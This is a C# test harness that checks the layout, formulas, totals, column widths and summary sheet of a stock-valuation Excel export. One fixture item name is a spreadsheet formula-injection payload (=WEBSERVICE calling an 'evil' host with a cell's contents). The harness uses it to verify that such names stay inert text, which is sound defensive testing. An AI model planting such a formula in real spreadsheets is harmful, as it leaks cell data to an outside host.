using System.Globalization;
using System.IO.Compression;
using System.Text.RegularExpressions;
using ClosedXML.Excel;
using MyApp.Api.DTOs;
using MyApp.Api.Helpers;

// ─────────────────────────────────────────────────────────────────────────────
// Offline regression harness for the Stock dashboard Excel export.
//
// The export reproduces the customs-lot stock sheet the importer clients keep by
// hand — the same workbook shape the opening-stock IMPORT reads. Its contract is
// therefore a LAYOUT: which column carries which figure, which cells are values
// and which are the client's own formulas, and a totals row that ties to the
// rows above it. None of that needs a database, and a bug in it shows up as a
// plausible-looking sheet rather than an error, so it has to be asserted rather
// than eyeballed.
//
//   cd scripts/stock_export_harness && dotnet run -c Release
//
// Writes the sample workbooks next to the binary (--out <dir> to place them
// elsewhere) so a failure can be opened and looked at.
// ─────────────────────────────────────────────────────────────────────────────

var outDir = ".";
for (var i = 0; i < args.Length - 1; i++)
    if (args[i] is "--out" or "-o") outDir = args[i + 1];
Directory.CreateDirectory(outDir);

var pass = 0;
var fail = 0;

void Check(string name, bool ok, string? detail = null)
{
    if (ok) { pass++; Console.WriteLine($"  [PASS] {name}"); }
    else { fail++; Console.WriteLine($"  [FAIL] {name}{(detail is null ? "" : "   — " + detail)}"); }
}

// ── The layout under test ───────────────────────────────────────────────────
// Letters, because every formula in the sheet and in the client's own workbook
// speaks in letters.

const int ClaimCol = 1;      // A
const int GdNoCol = 2;       // B
const int GdDateCol = 3;     // C
const int ItemCol = 4;       // D
const int SubCatCol = 5;     // E
const int Hs4Col = 6;        // F
const int Hs8Col = 7;        // G
const int PriceCol = 8;      // H
const int UnitCol = 9;       // I
const int OpenQtyCol = 10;   // J
const int OpenExlCol = 11;   // K
const int OpenRateCol = 12;  // L
const int OpenTaxCol = 13;   // M
const int ConsQtyCol = 14;   // N
const int ConsExlCol = 15;   // O
const int ConsRateCol = 16;  // P
const int ConsTaxCol = 17;   // Q
const int BalQtyCol = 18;    // R
const int BalExlCol = 19;    // S
const int BalRateCol = 20;   // T
const int BalTaxCol = 21;    // U
const int StripeCol = 22;    // V
const int CogsOpenExlCol = 24; // X
const int CogsOpenTaxCol = 25; // Y
const int CogsOpenVatCol = 26; // Z
const int CogsConsExlCol = 27; // AA
const int CogsConsTaxCol = 28; // AB
const int CogsConsVatCol = 29; // AC
const int CogsBalExlCol = 30;  // AD
const int CogsBalTaxCol = 31;  // AE
const int CogsBalVatCol = 32;  // AF

const int BandRow = 2;
const int HeaderRow = 3;
const int FirstDataRow = 4;

// ── Fixtures ────────────────────────────────────────────────────────────────
// Deliberately awkward: a name past the column width, a formula-looking name, a
// 25% rate (so a hard-coded 18% anywhere shows up), an item at zero stock, an
// item bought on purchase bills after its opening, an item with no customs lot
// at all, and one whose lots disagree on the declaration.

const string LongName = "MEKO FABRICS PREMIUM DENIM ROLL 58 INCH WIDE INDIGO SHADE 04 EXTRA LONG NAME";
const string EvilName = "=WEBSERVICE(\"http://evil/?x=\"&A1)";
// FBR names its units in full, and that is what ItemType.UOM holds — 22
// characters into a column the client's sheet sizes for "Pcs".
const string LongUom = "Numbers, pieces, units";
const string LongGdRef = "KAPE-HC-39764-SUPPLEMENTARY-02";

static StockExportItemDto Item(
    int id, string name, string? hs, string uom,
    decimal opening, decimal openingValue,
    decimal totalIn, decimal valueIn,
    decimal totalOut, decimal valueOut,
    decimal onHand, decimal excl, decimal rate,
    string? lotRef = null, DateTime? lotDate = null,
    decimal openingActualCost = 0m, decimal actualCost = 0m)
{
    var tax = Math.Round(excl * rate / 100m, 2, MidpointRounding.AwayFromZero);
    return new StockExportItemDto
    {
        Summary = new StockOnHandRowDto
        {
            ItemTypeId = id,
            ItemTypeName = name,
            HSCode = hs,
            UOM = uom,
            OpeningBalance = opening,
            OpeningValueExcludingTax = openingValue,
            TotalIn = totalIn,
            ValueIn = valueIn,
            TotalOut = totalOut,
            ValueOut = valueOut,
            OnHand = onHand,
            ValueExcludingTax = excl,
            SalesTaxRate = rate,
            SalesTax = tax,
            ValueIncludingTax = excl + tax,
            UnitCost = onHand > 0 ? Math.Round(excl / onHand, 4, MidpointRounding.AwayFromZero) : 0m,
            // Zero on both means the GD costing import has never priced this
            // item, which is the case for every company that does not import.
            OpeningActualCostExcludingTax = openingActualCost,
            ActualCostExcludingTax = actualCost,
            ActualUnitCost = onHand > 0 ? Math.Round(actualCost / onHand, 4, MidpointRounding.AwayFromZero) : 0m,
            LastMovementAt = new DateTime(2026, 2, 19),
        },
        LotRef = lotRef,
        LotDate = lotDate,
    };
}

var gdDate = new DateTime(2024, 10, 9);

var items = new List<StockExportItemDto>
{
    //                                              opening  openVal      in    valueIn    out   valueOut   onHand      excl  rate
    // GD-COSTED: opening landed 2,900,000 and 2,175,000 still on hand. Neither
    // equals the ratio derivation (3,355,844 x 6/7 = 2,876,438), so a row that
    // silently fell back to the formula would show up here.
    Item(1, LongName,            "9506.9100", "Pcs",   200m, 3_355_844m,   0m,        0m,  50m, 838_961m,   150m, 2_516_883m, 18m, "KAPE-HC-32050", gdDate,
         openingActualCost: 2_900_000m, actualCost: 2_175_000m),
    Item(2, EvilName,            "7318.1510", "KG",    100m,   500_000m,  40m,  200_000m,  90m, 450_000m,    50m,   250_000m, 25m, LongGdRef, gdDate),
    Item(3, "Bearing 6204 ZZ",   "8482.1000", "Pcs",     0m,         0m, 520m, 1_432_098m, 345m, 950_000m,  175m,   482_098m, 18m),
    Item(4, "Zero Stock Widget", "8513.1090", "Pcs",   540m, 1_080_000m,   0m,        0m, 540m, 1_080_000m,   0m,         0m, 18m, "KAPE-HC-6944", null),
    Item(5, "No Lot Item",       null,        LongUom,     55m,    98_765m,   0m,        0m,   0m,       0m,    55m,    98_765m, 25m),
};

StockExportDto Data(List<StockExportItemDto> rows, params string[] filters) => new()
{
    CompanyName = "Pak Trade Co",
    Title = "Stock Valuation Report",
    GeneratedAt = new DateTime(2026, 8, 31, 16, 42, 0),
    FiltersApplied = filters.ToList(),
    Items = rows,
};

var path = Path.Combine(outDir, "stock-export.xlsx");
var emptyPath = Path.Combine(outDir, "stock-export-empty.xlsx");
File.WriteAllBytes(path, StockExcelBuilder.Build(Data(items, "As at 31-08-2026")));
File.WriteAllBytes(emptyPath, StockExcelBuilder.Build(
    Data(new List<StockExportItemDto>(), "As at 31-08-2026", "Search: \"nothing\"")));

var lastDataRow = FirstDataRow + items.Count - 1;
var totalsRow = lastDataRow + 3;

// ── Suite 1: the sheet's own skeleton ────────────────────────────────────────

Console.WriteLine("\n=== 1. Sheet skeleton: banner, band labels, header, data start ===");
{
    using var wb = new XLWorkbook(path);

    Check("data sheet is named for the month it reports",
        wb.Worksheet(1).Name == "Aug 2026", wb.Worksheet(1).Name);
    Check("a Summary sheet follows it", wb.Worksheets.Count == 2
        && wb.Worksheet(2).Name == "Summary", string.Join(",", wb.Worksheets.Select(w => w.Name)));

    var ws = wb.Worksheet(1);

    Check("row 1 carries the Cost of Good Sold banner",
        ws.Cell(1, CogsOpenExlCol).GetString() == "Cost of Good Sold",
        ws.Cell(1, CogsOpenExlCol).GetString());
    Check("the banner spans X:AF and nothing left of it",
        ws.MergedRanges.Any(m => m.RangeAddress.ToStringRelative() == "X1:AF1")
        && ws.Cell(1, ClaimCol).IsEmpty() && ws.Cell(1, BalTaxCol).IsEmpty(),
        string.Join(",", ws.MergedRanges.Select(m => m.RangeAddress.ToStringRelative())));

    foreach (var (first, last, label) in new[]
    {
        ("J", "M", "Opening"), ("N", "Q", "Consumed"), ("R", "U", "Balance"),
        ("X", "Z", "Opening"), ("AA", "AC", "Consumed"), ("AD", "AF", "Balance"),
    })
    {
        var addr = $"{first}{BandRow}:{last}{BandRow}";
        var merged = ws.MergedRanges.Any(m =>
            string.Equals(m.RangeAddress.ToStringRelative(), addr, StringComparison.OrdinalIgnoreCase));
        Check($"band {addr} is merged and reads \"{label}\"",
            merged && ws.Cell(addr.Split(':')[0]).GetString() == label,
            $"merged={merged} text=\"{ws.Cell(addr.Split(':')[0]).GetString()}\"");
    }

    Check("band row leaves the identity columns empty",
        Enumerable.Range(ClaimCol, UnitCol).All(c => ws.Cell(BandRow, c).IsEmpty()));

    Check("the first data row is row 4", !ws.Cell(FirstDataRow, ItemCol).IsEmpty(),
        ws.Cell(FirstDataRow, ItemCol).GetString());
    Check("header rows are frozen", ws.SheetView.SplitRow == HeaderRow, ws.SheetView.SplitRow.ToString());
    // NO column freeze. Freezing through Unit locked 197 characters (~1,430px):
    // on a 1366-wide laptop the frozen pane is wider than the window, leaving a
    // sliver to scroll 23 columns through. Items alone is 65 wide, so no column
    // freeze that includes it is affordable, and the client's own workbook
    // freezes nothing. Reported against a real export 2026-09-13.
    Check("NO columns are frozen, so the whole sheet scrolls across",
        ws.SheetView.SplitColumn == 0, ws.SheetView.SplitColumn.ToString());
    Check("header repeats on every printed page",
        ws.PageSetup.FirstRowToRepeatAtTop == HeaderRow, ws.PageSetup.FirstRowToRepeatAtTop.ToString());
    Check("no outline groups — the movement drill-down is gone",
        ws.RowsUsed().All(r => r.OutlineLevel == 0));
}

// ── Suite 2: the header, column for column ───────────────────────────────────

Console.WriteLine("\n=== 2. Header: every column in its client-sheet position ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    var expected = new (int Col, string Label)[]
    {
        (ClaimCol, "Claim Month"), (GdNoCol, "GDs No"), (GdDateCol, "GD Date"),
        (ItemCol, "Items"), (SubCatCol, "Sub cat"),
        (Hs4Col, "4 Digit Hs Code"), (Hs8Col, "8 Digit Hs Code"),
        (PriceCol, "Price"), (UnitCol, "Unit"),
        (OpenQtyCol, "Qty"), (OpenExlCol, "Exl"), (OpenRateCol, "Rate"), (OpenTaxCol, "S.Tax"),
        (ConsQtyCol, "Qty"), (ConsExlCol, "Consumed Exl"), (ConsRateCol, "Rate"), (ConsTaxCol, "S.Tax"),
        (BalQtyCol, "Qty"), (BalExlCol, "Bal Exl"), (BalRateCol, "Rate"), (BalTaxCol, "S.Tax"),
        (CogsOpenExlCol, "Exl"), (CogsOpenTaxCol, "S.Tax"), (CogsOpenVatCol, "Vat"),
        (CogsConsExlCol, "Exl"), (CogsConsTaxCol, "S.Tax"), (CogsConsVatCol, "Vat"),
        (CogsBalExlCol, "Exl"), (CogsBalTaxCol, "S.Tax"), (CogsBalVatCol, "Vat"),
    };
    foreach (var (col, label) in expected)
        Check($"header {Letter(col)}{HeaderRow} is \"{label}\"",
            ws.Cell(HeaderRow, col).GetString() == label, ws.Cell(HeaderRow, col).GetString());

    Check("the divider stripe carries colour but no caption",
        ws.Cell(HeaderRow, StripeCol).GetString().Length == 0
        && ws.Cell(HeaderRow, StripeCol).Style.Fill.BackgroundColor.Color.ToArgb()
           == System.Drawing.Color.FromArgb(255, 0, 176, 240).ToArgb(),
        ws.Cell(HeaderRow, StripeCol).Style.Fill.BackgroundColor.ToString());

    // Each block is colour-coded the same way on the stock side and inside the
    // Cost of Good Sold band, so a reader tracks one block across the sheet.
    foreach (var (col, argb, what) in new[]
    {
        (OpenQtyCol, "FFFFFF00", "Opening"), (CogsOpenExlCol, "FFFFFF00", "COGS Opening"),
        (ConsQtyCol, "FFFFC000", "Consumed"), (CogsConsExlCol, "FFFFC000", "COGS Consumed"),
        (BalQtyCol, "FFA9D08E", "Balance"), (CogsBalExlCol, "FFD0CECE", "COGS Balance"),
    })
        Check($"{what} header is filled {argb}",
            ws.Cell(HeaderRow, col).Style.Fill.BackgroundColor.Color.ToArgb()
              == unchecked((int)Convert.ToUInt32(argb, 16)),
            ws.Cell(HeaderRow, col).Style.Fill.BackgroundColor.ToString());
}

// ── Suite 3: values vs formulas ──────────────────────────────────────────────
// The single rule this export turns on: a figure the DASHBOARD reports is a
// VALUE, a figure it does not is the client's own FORMULA. Balance is the live
// position, never =J-N, because StockValuation clamps value to zero on an
// emptied bin and the subtraction can legitimately differ from the walk.

Console.WriteLine("\n=== 3. Values vs formulas ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    for (var i = 0; i < items.Count; i++)
    {
        var r = FirstDataRow + i;
        var s = items[i].Summary;
        var label = Trim(s.ItemTypeName, 24);

        // Opening is EVERYTHING RECEIVED — the opening balance plus purchases
        // since. The client's sheet has no "received" block, and this is what
        // keeps Balance = Opening - Consumed true for a company that buys.
        Check($"\"{label}\": Opening Qty = opening + total in",
            ws.Cell(r, OpenQtyCol).GetValue<decimal>() == s.OpeningBalance + s.TotalIn,
            $"{ws.Cell(r, OpenQtyCol).GetValue<decimal>()} vs {s.OpeningBalance + s.TotalIn}");
        Check($"\"{label}\": Opening Exl = opening value + value in",
            ws.Cell(r, OpenExlCol).GetValue<decimal>() == s.OpeningValueExcludingTax + s.ValueIn,
            $"{ws.Cell(r, OpenExlCol).GetValue<decimal>()}");

        Check($"\"{label}\": Consumed Qty = total out",
            ws.Cell(r, ConsQtyCol).GetValue<decimal>() == s.TotalOut);
        Check($"\"{label}\": Consumed Exl = value out",
            ws.Cell(r, ConsExlCol).GetValue<decimal>() == s.ValueOut);

        Check($"\"{label}\": Balance Qty is the live on-hand, not a subtraction",
            !ws.Cell(r, BalQtyCol).HasFormula
            && ws.Cell(r, BalQtyCol).GetValue<decimal>() == s.OnHand,
            $"formula={ws.Cell(r, BalQtyCol).HasFormula} value={ws.Cell(r, BalQtyCol).GetValue<decimal>()}");
        Check($"\"{label}\": Balance Exl is the walk's value, not a subtraction",
            !ws.Cell(r, BalExlCol).HasFormula
            && ws.Cell(r, BalExlCol).GetValue<decimal>() == s.ValueExcludingTax);
        Check($"\"{label}\": Balance S.Tax is the dashboard's own figure",
            !ws.Cell(r, BalTaxCol).HasFormula
            && ws.Cell(r, BalTaxCol).GetValue<decimal>() == s.SalesTax);

        // The rate is stored as a FRACTION under a percent format, as the
        // client's sheet stores it — 0.18 shown as 18%.
        Check($"\"{label}\": Rate is stored as a fraction",
            ws.Cell(r, OpenRateCol).GetValue<decimal>() == s.SalesTaxRate / 100m,
            ws.Cell(r, OpenRateCol).GetString());
        Check($"\"{label}\": Balance Rate matches the item's rate",
            ws.Cell(r, BalRateCol).GetValue<decimal>() == s.SalesTaxRate / 100m);

        foreach (var (col, formula) in new[]
        {
            (Hs4Col,        $"LEFT(G{r},4)"),
            (PriceCol,      $"IFERROR(K{r}/J{r},\"\")"),
            (OpenTaxCol,    $"L{r}*K{r}"),
            (ConsRateCol,   $"L{r}"),
            (ConsTaxCol,    $"O{r}*P{r}"),
            // The tax cells are derived from the cost beside them at the row's
            // own rate, whichever shape the block took.
            (CogsOpenTaxCol, $"X{r}*L{r}"),
            (CogsOpenVatCol, $"X{r}*3%"),
            (CogsConsTaxCol, $"AA{r}*L{r}"),
            (CogsConsVatCol, $"AA{r}*3%"),
            (CogsBalTaxCol,  $"Y{r}-AB{r}"),
            (CogsBalVatCol,  $"Z{r}-AC{r}"),
        })
            Check($"\"{label}\": {Letter(col)}{r} is =​{formula}",
                ws.Cell(r, col).HasFormula && ws.Cell(r, col).FormulaA1 == formula,
                ws.Cell(r, col).HasFormula ? ws.Cell(r, col).FormulaA1 : "(not a formula)");

        // ── Cost of Good Sold takes one of two shapes ────────────────────────
        // MEASURED when the GD costing import has priced the item: the opening
        // and on-hand landed costs are stated and Consumed falls out as X - AD,
        // which is what the goods that left actually cost. DERIVED otherwise,
        // from the client's own tax-uplift arithmetic. Either way AD = X - AA
        // still holds — only which cell carries the formula moves.
        if (s.OpeningActualCostExcludingTax > 0m)
        {
            Check($"\"{label}\": costed — X is the imported opening landed cost",
                !ws.Cell(r, CogsOpenExlCol).HasFormula
                && ws.Cell(r, CogsOpenExlCol).GetValue<decimal>() == s.OpeningActualCostExcludingTax,
                ws.Cell(r, CogsOpenExlCol).HasFormula
                    ? ws.Cell(r, CogsOpenExlCol).FormulaA1
                    : ws.Cell(r, CogsOpenExlCol).GetValue<decimal>().ToString());
            Check($"\"{label}\": costed — AD is the on-hand landed cost, which DEPLETES",
                !ws.Cell(r, CogsBalExlCol).HasFormula
                && ws.Cell(r, CogsBalExlCol).GetValue<decimal>() == s.ActualCostExcludingTax);
            Check($"\"{label}\": costed — AA is the cost of goods SOLD (=X-AD)",
                ws.Cell(r, CogsConsExlCol).FormulaA1 == $"X{r}-AD{r}",
                ws.Cell(r, CogsConsExlCol).FormulaA1);
            // The measured figure must WIN. The ratio would say 2,876,438 here.
            var derived = s.OpeningValueExcludingTax + s.ValueIn;
            derived = s.SalesTaxRate == 0m
                ? derived
                : derived * s.SalesTaxRate / (s.SalesTaxRate + 3m);
            Check($"\"{label}\": the measured cost WINS over the ratio derivation",
                Math.Abs(ws.Cell(r, CogsOpenExlCol).GetValue<decimal>() - derived) > 1m,
                $"stated {ws.Cell(r, CogsOpenExlCol).GetValue<decimal>()} vs ratio {derived:F2}");
        }
        else
        {
            Check($"\"{label}\": uncosted — X unwinds the tax uplift",
                ws.Cell(r, CogsOpenExlCol).FormulaA1
                    == $"IF(L{r}=0,K{r},K{r}*L{r}/(L{r}+3%))",
                ws.Cell(r, CogsOpenExlCol).HasFormula
                    ? ws.Cell(r, CogsOpenExlCol).FormulaA1 : "(not a formula)");
            Check($"\"{label}\": uncosted — AA comes off the consumed sales tax",
                ws.Cell(r, CogsConsExlCol).FormulaA1 == $"Q{r}/(L{r}+3%)",
                ws.Cell(r, CogsConsExlCol).FormulaA1);
            Check($"\"{label}\": uncosted — AD = X - AA",
                ws.Cell(r, CogsBalExlCol).FormulaA1 == $"X{r}-AA{r}",
                ws.Cell(r, CogsBalExlCol).FormulaA1);
        }

        // Nothing in the system records either of these.
        Check($"\"{label}\": Claim Month is left blank", ws.Cell(r, ClaimCol).IsEmpty());
        Check($"\"{label}\": Sub cat is left blank", ws.Cell(r, SubCatCol).IsEmpty());
    }

    // A 25% item must not pick up an 18% basis anywhere — the consumed COGS
    // basis is the row's own rate plus VAT, not the client's literal 21%.
    var evilRow = FirstDataRow + 1;
    Check("a 25% line derives its COGS basis from its own rate",
        ws.Cell(evilRow, CogsConsExlCol).FormulaA1 == $"Q{evilRow}/(L{evilRow}+3%)",
        ws.Cell(evilRow, CogsConsExlCol).FormulaA1);
}

// ── Suite 4: the customs declaration columns ─────────────────────────────────

Console.WriteLine("\n=== 4. GDs No / GD Date ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    Check("an item with one declaration names it",
        ws.Cell(FirstDataRow, GdNoCol).GetString() == "KAPE-HC-32050",
        ws.Cell(FirstDataRow, GdNoCol).GetString());
    Check("its declaration date comes with it",
        ws.Cell(FirstDataRow, GdDateCol).GetDateTime() == gdDate,
        ws.Cell(FirstDataRow, GdDateCol).GetString());
    Check("the date is formatted day-first",
        ws.Cell(FirstDataRow, GdDateCol).Style.NumberFormat.Format == "dd-mm-yyyy",
        ws.Cell(FirstDataRow, GdDateCol).Style.NumberFormat.Format);

    // Row 3 (Bearing) was bought on purchase bills and has no lot at all.
    Check("an item with no customs lot leaves both columns blank",
        ws.Cell(FirstDataRow + 2, GdNoCol).IsEmpty() && ws.Cell(FirstDataRow + 2, GdDateCol).IsEmpty());

    // Row 4 names a declaration but its lots disagree on the date.
    Check("a declaration with no single date states the reference only",
        ws.Cell(FirstDataRow + 3, GdNoCol).GetString() == "KAPE-HC-6944"
        && ws.Cell(FirstDataRow + 3, GdDateCol).IsEmpty(),
        ws.Cell(FirstDataRow + 3, GdDateCol).GetString());

    // The 4-digit heading is derived from the 8-digit code, so an item with no
    // HS code at all must not invent one.
    Check("an item with no HS code leaves the 8-digit column blank",
        ws.Cell(FirstDataRow + 4, Hs8Col).IsEmpty());
}

// ── Suite 5: the totals row ──────────────────────────────────────────────────

Console.WriteLine("\n=== 5. Totals ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    Check("two blank rows separate the data from the totals",
        ws.Row(lastDataRow + 1).IsEmpty() && ws.Row(lastDataRow + 2).IsEmpty(),
        $"rows {lastDataRow + 1}/{lastDataRow + 2}");

    int[] summed =
    {
        OpenQtyCol, OpenExlCol, OpenTaxCol,
        ConsQtyCol, ConsExlCol, ConsTaxCol,
        BalQtyCol, BalExlCol, BalTaxCol,
        CogsOpenExlCol, CogsOpenTaxCol, CogsOpenVatCol,
        CogsConsExlCol, CogsConsTaxCol, CogsConsVatCol,
        CogsBalExlCol, CogsBalTaxCol, CogsBalVatCol,
    };
    foreach (var col in summed)
    {
        var want = $"SUM({Letter(col)}{FirstDataRow}:{Letter(col)}{totalsRow - 1})";
        Check($"TOTAL {Letter(col)} is ={want}",
            ws.Cell(totalsRow, col).FormulaA1 == want,
            ws.Cell(totalsRow, col).HasFormula ? ws.Cell(totalsRow, col).FormulaA1 : "(none)");
    }

    // The SUM must reach past the blank rows, so a row appended at the bottom
    // is picked up rather than silently dropped out of the total.
    Check("the SUM range covers the blank rows below the data",
        ws.Cell(totalsRow, OpenQtyCol).FormulaA1.EndsWith($"{totalsRow - 1})", StringComparison.Ordinal),
        ws.Cell(totalsRow, OpenQtyCol).FormulaA1);

    // A percentage and a weighted unit cost do not add up.
    foreach (var (col, what) in new[]
        { (OpenRateCol, "Opening Rate"), (ConsRateCol, "Consumed Rate"),
          (BalRateCol, "Balance Rate"), (PriceCol, "Price") })
        Check($"TOTAL leaves {what} blank", ws.Cell(totalsRow, col).IsEmpty(),
            ws.Cell(totalsRow, col).GetString());

    // An empty export must not write =SUM(J4:J3) — Excel refuses to open it.
    using var wbEmpty = new XLWorkbook(emptyPath);
    var wsEmpty = wbEmpty.Worksheet(1);
    Check("an export with no items writes no totals row",
        wsEmpty.CellsUsed().All(c => !c.HasFormula || !c.FormulaA1.StartsWith("SUM", StringComparison.Ordinal)),
        string.Join(",", wsEmpty.CellsUsed().Where(c => c.HasFormula).Select(c => c.FormulaA1).Take(3)));
    Check("an export with no items still carries the header",
        wsEmpty.Cell(HeaderRow, ItemCol).GetString() == "Items");
}

// ── Suite 6: nothing is cut off ──────────────────────────────────────────────

Console.WriteLine("\n=== 6. Widths: every value fits its cell ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    // The widths ARE part of the layout being reproduced, so they are pinned
    // rather than measured from content — and asserted against the SAVED XML,
    // not the ClosedXML property. ClosedXML treats Width as the CONTENT width
    // and adds the default font's padding on save, so the property reads back
    // what the builder passed while Excel sees 0.710625 more. Reading the part
    // is the only way this check sees what the client's Excel will.
    var savedWidths = SavedColumnWidths(path);
    foreach (var (col, width) in new[]
    {
        (ClaimCol, 11.5703125), (GdNoCol, 16.0), (GdDateCol, 13.85546875),
        (ItemCol, 65.140625), (SubCatCol, 26.42578125),
        (Hs4Col, 21.0), (Hs8Col, 21.0), (PriceCol, 12.140625), (UnitCol, 10.140625),
        (OpenQtyCol, 10.85546875), (OpenExlCol, 14.5703125), (OpenRateCol, 10.28515625),
        (OpenTaxCol, 14.5703125), (ConsExlCol, 21.140625), (ConsTaxCol, 13.140625),
        (BalExlCol, 18.0), (BalRateCol, 10.42578125), (BalTaxCol, 16.5703125),
        (StripeCol, 9.140625),
        (CogsOpenExlCol, 18.0), (CogsConsExlCol, 14.7109375), (CogsBalVatCol, 14.5703125),
    })
        Check($"column {Letter(col)} is saved at the client's width {width}",
            savedWidths.TryGetValue(col, out var got) && Math.Abs(got - width) < 0.0001,
            savedWidths.TryGetValue(col, out var g) ? g.ToString("R") : "(not written)");

    var merged = ws.MergedRanges.SelectMany(r => r.Cells())
        .Select(c => c.Address.ToString()!).ToHashSet(StringComparer.OrdinalIgnoreCase);

    var clipped = new List<string>();
    foreach (var cell in ws.CellsUsed())
    {
        if (merged.Contains(cell.Address.ToString()!)) continue;
        if (cell.Style.Alignment.WrapText) continue;
        if (cell.HasFormula) continue;              // rendered width depends on the result
        var text = cell.GetFormattedString();
        if (string.IsNullOrEmpty(text)) continue;
        var width = ws.Column(cell.Address.ColumnNumber).Width;
        if (text.Length > width) clipped.Add($"{cell.Address} needs {text.Length} has {width:F1}: {Trim(text)}");
    }
    Check("no clipped cell", clipped.Count == 0, string.Join(" | ", clipped.Take(4)));

    // Item names run past any sane column width, and the next cell is occupied,
    // so wrapping is what keeps the whole name readable. (Same failure the
    // dashboard hit with nowrap+ellipsis: "MEKO FABRICS" and "MEKO DENIM".)
    var nameCell = ws.Cell(FirstDataRow, ItemCol);
    Check("a long item name wraps rather than clipping",
        nameCell.GetString() == LongName && nameCell.Style.Alignment.WrapText,
        $"wrap={nameCell.Style.Alignment.WrapText}");

    // The other two free-text columns the client's widths cannot size away.
    // A UOM here is FBR's DESCRIPTION, not the "Pcs" their own sheet holds.
    var uomCell = ws.Cell(FirstDataRow + 4, UnitCol);
    Check("a full FBR unit description wraps rather than clipping",
        uomCell.GetString() == LongUom && uomCell.Style.Alignment.WrapText,
        $"\"{uomCell.GetString()}\" wrap={uomCell.Style.Alignment.WrapText}");
    var gdCell = ws.Cell(FirstDataRow + 1, GdNoCol);
    Check("a long GD reference wraps rather than clipping",
        gdCell.GetString() == LongGdRef && gdCell.Style.Alignment.WrapText,
        $"\"{gdCell.GetString()}\" wrap={gdCell.Style.Alignment.WrapText}");
    Check("\"Claim Month\" wraps in its narrow column",
        ws.Cell(HeaderRow, ClaimCol).Style.Alignment.WrapText);
}

// ── Suite 7: injection safety ────────────────────────────────────────────────
// The sheet is deliberately FULL of formulas now, so "no formulas anywhere" is
// no longer the test. What must hold is that no OPERATOR STRING ever becomes
// one.

Console.WriteLine("\n=== 7. A formula-looking item name stays text ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet(1);

    var evil = ws.Cell(FirstDataRow + 1, ItemCol);
    Check("a formula-looking item name is stored as TEXT", evil.DataType == XLDataType.Text,
        evil.DataType.ToString());
    Check("a formula-looking item name is quote-prefixed", evil.Style.IncludeQuotePrefix);
    Check("a formula-looking item name is not a formula", !evil.HasFormula);

    var sheetXml = ReadSheetXml(path);
    Check("no <f> element carries the operator's string",
        !Regex.Matches(sheetXml, @"<[A-Za-z0-9]*:?f[ >][^<]*")
              .Any(m => m.Value.Contains("WEBSERVICE", StringComparison.OrdinalIgnoreCase)));

    // The formulas the sheet DOES carry are the client's own, and they have to
    // survive the round trip or the workbook opens with #NAME? everywhere.
    Check("the sheet carries the client's formulas",
        Regex.IsMatch(sheetXml, @"<[A-Za-z0-9]*:?f[ >]"));
}

// ── Suite 8: the Summary sheet carries the provenance ────────────────────────
// The data sheet has to BE the client's layout, which has no banner — but an
// export that cannot say it was filtered or scoped is not auditable.

Console.WriteLine("\n=== 8. Summary sheet ===");
{
    using var wb = new XLWorkbook(path);
    var ws = wb.Worksheet("Summary");
    var text = string.Join("\n", ws.CellsUsed().Select(c => c.GetString()));

    Check("names the company", text.Contains("Pak Trade Co"));
    Check("names the period", text.Contains("Aug 2026"));
    Check("states what shaped the export", text.Contains("As at 31-08-2026"));
    Check("states how many items", text.Contains("5 items"));
    Check("states when it was generated", text.Contains("Generated 31-08-2026 16:42"));

    // The four headline figures, summed from the rows written, so the workbook
    // states its own totals rather than leaving them to be read off the grid.
    var excl = items.Sum(i => i.Summary.ValueExcludingTax);
    var stated = ws.CellsUsed().First(c => c.GetString() == "Excluding tax")
                   .CellRight().GetValue<decimal>();
    Check("headline Excluding tax ties to the rows", stated == excl, $"{stated} vs {excl}");

    Check("explains that Opening includes purchases",
        text.Contains("Opening is everything received"));
    Check("explains that Balance is the live position",
        text.Contains("not Opening minus Consumed"));
    Check("explains where the Cost of Good Sold figures come from",
        text.Contains("imported GD landed cost")
        && text.Contains("unwinds the tax uplift"), Trim(text, 200));
    Check("says Claim Month and Sub cat are the operator's",
        text.Contains("Claim Month and Sub cat are yours to fill"));

    using var wbEmpty = new XLWorkbook(emptyPath);
    var emptyText = string.Join("\n", wbEmpty.Worksheet("Summary").CellsUsed().Select(c => c.GetString()));
    Check("a filtered export says so", emptyText.Contains("Search: \"nothing\""), Trim(emptyText, 120));
    Check("an empty export says it has no items", emptyText.Contains("0 items"));
}

Console.WriteLine($"\n=== {pass}/{pass + fail} checks passed ===");
if (fail > 0)
{
    Console.WriteLine($"{fail} FAILING CHECK(S). Sample workbooks written to {Path.GetFullPath(outDir)}");
    return 1;
}
Console.WriteLine("STOCK EXPORT HARNESS PASSED");
return 0;

static string Letter(int col)
{
    var s = "";
    while (col > 0)
    {
        var m = (col - 1) % 26;
        s = (char)('A' + m) + s;
        col = (col - 1) / 26;
    }
    return s;
}

/// <summary>
/// The width Excel will actually apply, read out of the saved worksheet part.
/// A &lt;col&gt; element covers a RANGE (min..max), and ClosedXML merges adjacent
/// equal widths into one — F and G at 21.0 come out as a single min="6" max="7"
/// — so the range has to be expanded or half the columns read as unset.
/// </summary>
static Dictionary<int, double> SavedColumnWidths(string path)
{
    var xml = ReadSheetXml(path);
    var widths = new Dictionary<int, double>();
    foreach (Match m in Regex.Matches(xml,
        @"<[A-Za-z0-9]*:?col [^>]*?min=""(?<min>[0-9]+)""[^>]*?max=""(?<max>[0-9]+)""[^>]*?width=""(?<w>[0-9.]+)"""))
    {
        var min = int.Parse(m.Groups["min"].Value, CultureInfo.InvariantCulture);
        var max = int.Parse(m.Groups["max"].Value, CultureInfo.InvariantCulture);
        var w = double.Parse(m.Groups["w"].Value, CultureInfo.InvariantCulture);
        for (var c = min; c <= max; c++) widths[c] = w;
    }
    return widths;
}

static string ReadSheetXml(string path)
{
    using var zip = ZipFile.OpenRead(path);
    var entry = zip.Entries.First(e => e.FullName.StartsWith("xl/worksheets/", StringComparison.Ordinal)
                                    && e.FullName.EndsWith(".xml", StringComparison.Ordinal));
    using var reader = new StreamReader(entry.Open());
    return reader.ReadToEnd();
}

static string Trim(string s, int max = 48) => s.Length <= max ? s : s[..max] + "…";
